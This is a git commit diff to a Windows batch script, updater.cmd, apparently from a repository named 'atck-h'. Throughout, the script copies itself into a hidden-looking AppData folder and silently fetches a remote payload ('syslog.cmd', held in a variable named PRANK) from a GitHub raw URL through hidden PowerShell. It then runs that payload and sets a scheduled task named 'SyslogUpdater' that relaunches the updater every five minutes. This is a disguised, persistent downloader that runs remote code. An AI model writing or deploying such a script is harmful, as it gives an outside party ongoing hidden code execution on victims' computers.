c4e528affda6a46a1e12d515ecc26af5839aa262
Maizan <memaizanx@gmail.com>
2026-02-25 16:19:08 +0300

    atck

--- updater.cmd
+++ updater.cmd
@@ -1,48 +1,41 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt
-set FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd
+set "BASE=%APPDATA%\SysCache"
+set "UPDATER=%BASE%\updater.cmd"
+set "PRANK=%BASE%\syslog.cmd"
+set "LOCAL_VER=%BASE%\local_version.txt"
+set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
+set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
+set "REMOTE_VER=%TEMP%\rv.txt"
+set "DOWNLOAD=%TEMP%\sn.cmd"
 
-set BASE_FOLDER=%APPDATA%\SysCache
-if not exist "%BASE_FOLDER%" mkdir "%BASE_FOLDER%"
+if not exist "%BASE%" mkdir "%BASE%"
 
-set LOCAL_VERSION_FILE=%BASE_FOLDER%\local_version.txt
-set REMOTE_VERSION_FILE=%TEMP%\rv.txt
-set DOWNLOAD_FILE=%TEMP%\sn.cmd
-set FINAL_FILE=%BASE_FOLDER%\syslog.cmd
+:: Copy this updater to the base folder (if not already there)
+if /i not "%~f0"=="%UPDATER%" (
+    copy /Y "%~f0" "%UPDATER%" >nul
+)
 
-:: Download remote version silently
-powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VERSION_FILE%' -ErrorAction Stop} catch {}" >nul 2>&1
+:: Download remote version
+powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
+if not exist "%REMOTE_VER%" goto RUN
 
-if not exist "%REMOTE_VERSION_FILE%" exit
+set /p REMOTE=<"%REMOTE_VER%"
+if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"
 
-set /p REMOTE_VERSION=<"%REMOTE_VERSION_FILE%"
-
-if not exist "%LOCAL_VERSION_FILE%" goto UPDATE
-
-set /p LOCAL_VERSION=<"%LOCAL_VERSION_FILE%"
-
-if "%LOCAL_VERSION%"=="%REMOTE_VERSION%" goto RUN
-
-:UPDATE
-powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD_FILE%' -ErrorAction Stop} catch {}" >nul 2>&1
-
-if exist "%DOWNLOAD_FILE%" (
-    move /Y "%DOWNLOAD_FILE%" "%FINAL_FILE%" >nul
-    echo %REMOTE_VERSION% > "%LOCAL_VERSION_FILE%"
+if not "%LOCAL%"=="%REMOTE%" (
+    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
+    if exist "%DOWNLOAD%" (
+        move /Y "%DOWNLOAD%" "%PRANK%" >nul
+        echo %REMOTE% > "%LOCAL_VER%"
+    )
 )
 
 :RUN
-if exist "%FINAL_FILE%" (
-    start "" "%FINAL_FILE%"
-)
+if exist "%PRANK%" start "" "%PRANK%"
 
-:: --- New section: create scheduled task to run every 5 minutes ---
-:: Task name: "SyslogTask"
-:: Runs: %FINAL_FILE%
-:: Frequency: every 5 minutes, indefinitely
-:: /f forces overwrite if the task already exists
-schtasks /create /tn "SyslogTask" /tr "cmd /c start /min \"\" \"%FINAL_FILE%\"" /sc minute /mo 5 /f >nul 2>&1
+:: Create scheduled task that runs THIS UPDATER every 5 minutes
+schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo 5 /f >nul 2>&1
 
 endlocal
